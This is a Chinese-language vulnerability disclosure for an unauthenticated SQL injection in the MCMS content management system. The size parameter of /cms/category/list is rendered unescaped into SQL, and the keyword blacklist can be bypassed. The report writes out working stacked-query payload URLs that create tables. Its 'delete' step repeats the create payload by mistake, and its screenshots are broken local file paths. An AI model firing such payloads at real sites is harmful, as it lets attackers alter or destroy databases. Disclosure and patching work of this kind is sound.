# MCMS 前台SQL注入漏洞报告

## 漏洞介绍

铭飞MCMS最新版（开源Java CMS，Gitee 2.5k Star）前端接口 `/cms/category/list` 存在SQL注入。`size` 参数通过FreeMarker `${size}` 直接拼入SQL的 `LIMIT` 子句，未参数化绑定。

内置 `SqlInjectionUtil` 使用正则黑名单过滤，但 `CREATE/TABLE/SET/PREPARE/EXECUTE` 等关键字不在列表中可绕过。攻击者无需登录即可执行堆叠SQL语句。

---

## 影响版本

MCMS (ms-mcms) <= 6.2.0

## 利用条件

- 目标可访问 `/cms/category/list`（默认无需认证）

---

## 漏洞复现

前端接受参数点：

![image-20260724111952531](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260724111952531.png)

![image-20260724114530639](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260724114530639.png)

执行sql注入payload前：

![image-20260724112230187](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260724112230187.png)

执行创建数据库语句，test724成功创建：/cms/category/list?type=top&size=1;CREATE%20TABLE%20test724(id%20INT);--      

![image-20260724112245040](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260724112245040.png)

执行删除数据库语句，test724成功删除：/cms/category/list?type=top&size=1;CREATE%20TABLE%20test724(id%20INT);--      

![image-20260724112404752](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260724112404752.png)

CategoryBizImpl.java文件中用户参数注入FreeMarker模板, 渲染出最终SQL![img](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml9012\wps1.jpg)

 

 

Channel的sql模板接受size参数并且没有做任何限制，触发sql注入

![img](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml9012\wps2.jpg)
